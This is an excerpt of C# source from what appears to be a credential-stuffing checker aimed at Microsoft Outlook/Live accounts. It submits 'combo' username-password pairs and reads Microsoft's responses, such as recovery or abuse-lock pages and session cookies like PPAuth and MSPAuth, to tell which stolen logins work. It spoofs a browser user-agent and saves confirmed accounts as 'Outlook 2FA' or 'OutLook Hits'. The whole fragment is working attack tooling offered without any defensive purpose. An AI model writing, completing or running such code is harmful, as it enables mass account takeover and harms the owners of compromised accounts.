            ...
            try
            {
                ...
                if (str2.Contains("IfExistsResult\":0"))
                {
                    ...
                    else if (str3.Contains("action=\"https://account.live.com/recover") || str3.Contains("action=\"https://account.live.com/Abuse") || str3.Contains("action=\"https://account.live.com/ar/cancel") || str3.Contains("action=\"https://account.live.com/identity/confirm") || str3.Contains("title>Help us protect your account") || str3.Contains("action=\"https://account.live.com/RecoverAccount") || str3.Contains("action=\"https://account.live.com/Email/Confirm") || str3.Contains("action=\"https://account.live.com/Email/Confirm") || str3.Contains("action=\"https://account.live.com/Abuse") || str3.Contains("action=\"https://account.live.com/profile/accrue"))
                    {
                        ...
                        string fact = Cryptography.LR(str3, "form name=\"fmHF\" id=\"fmHF\" action=\"", "\" method=\"post").FirstOrDefault();
                        string url1 = Cryptography.LR(str3, "form name=\"fmHF\" id=\"fmHF\" action=\"", "\" method=\"post").FirstOrDefault();
                        string url = url1.Replace("FR-FR", "en-US");
                        string ppr = Cryptography.LR(str3, "type=\"hidden\" name=\"pprid\" id=\"pprid\" value=\"", "\"> ").FirstOrDefault();
                        string uaidr = Cryptography.LR(str3, "type=\"hidden\" name=\"uaid\" id=\"uaid\" value=\"", "\"> ").FirstOrDefault();
                        string ipt = Cryptography.LR(str3, "type=\"hidden\" name=\"ipt\" id=\"ipt\" value=\"", "\"> ").FirstOrDefault();
                        httpRequest.ClearAllHeaders();
                        ...
                        httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47");
                        httpRequest.AddHeader("sec-ch-ua", "\"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"");
                        string str4 = httpRequest.Post(url, "ipt=" + ipt + "&pprid=" + ppr + "&uaid=" + uaidr, "application/x-www-form-urlencoded").ToString();
                        if (str4.Contains("Send code") || str4.Contains("Verify online\", \"proofOptionLost\"") || str4.Contains("Your security info change is still pending") || str4.Contains("aka.ms/compliancelock"))
                        {
                            ++Program.Free;
                            ++Program.Check;
                            ++Program.Cps;
                            ...
                            Program.Save(combo, "Outlook 2FA");
                            return true;
                        }
                        else
                        {
                            ...
                            Program.Save(combo, "OutLook Hits");
                            return true;
                        }
                    }
                    else if (str3.Contains("PPAuth") || str3.Contains("WLSSC") || str3.Contains("action=\"https://outlook.live.com/owa") || str3.Contains("MSPAuth"))
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
